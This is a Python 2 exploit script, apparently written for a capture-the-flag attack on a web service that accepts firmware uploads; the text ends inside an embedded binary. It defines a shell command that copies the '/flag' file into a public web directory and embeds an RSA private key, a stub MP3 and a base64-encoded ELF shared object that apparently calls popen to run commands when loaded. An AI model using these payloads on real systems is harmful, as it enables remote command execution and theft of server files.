#!/usr/bin/python2
#coding:utf-8

from sys import *
from base64 import *
from Crypto.PublicKey import RSA
import requests
import string
import time
import hashlib
import random
import json
from datetime import datetime


# get random string
def rand_str(length=8):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))


timeout = 1.0
retry_count = 5
logging = 0

internet_ip = ''
site_url = ''
s = requests.session()
time_zone_offset = 60 * 60 * 8
flag_path = "/uploads/firmware/%s" % rand_str()
command = "/usr/bin/tac /flag > /var/www/html%s" % flag_path

preset_key = b64decode('LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg==')
preset_music = b64decode('SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA=')
preset_firmare = b64decode('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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXVLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////JdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JYIvAABmkAAAAAAAAAAASI09wS8AAEiNBbovAABIOfh0FUiLBT4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09kS8AAEiNNYovAABIKf5Iwf4DSInwSMHoP0gBxkjR/nQUSIsFFS8AAEiFwHQI/+BmDx9EAADDDx+AAAAAAIA9aS8AAAB1L1VIgz32LgAAAEiJ5XQMSIs9Ki8AAOhd////6Gj////GBUEvAAABXcMPH4AAAAAAww8fgAAAAADpe////1VIieVIg+wQSIsFpC4AAEiLALowAQAAvgAAAABIicfo9/7//0iNNaAOAABIjT2hDgAA6PT+//9IiUX4SIN9+AB0MUiLBWouAABIiwBIi1X4SInRugABAAC+AQAAAEiJx+iW/v//SItF+EiJx+ia/v//6wGQycMASIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAARsDOyAAAAADAAAAFO///zwAAABk7///ZAAAACnw//98AAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAADQ7v//UAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA+O7//wgAAAAAAAAAAAAAABwAAABcAAAApe///3YAAAAAQQ4QhgJDDQYCcQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA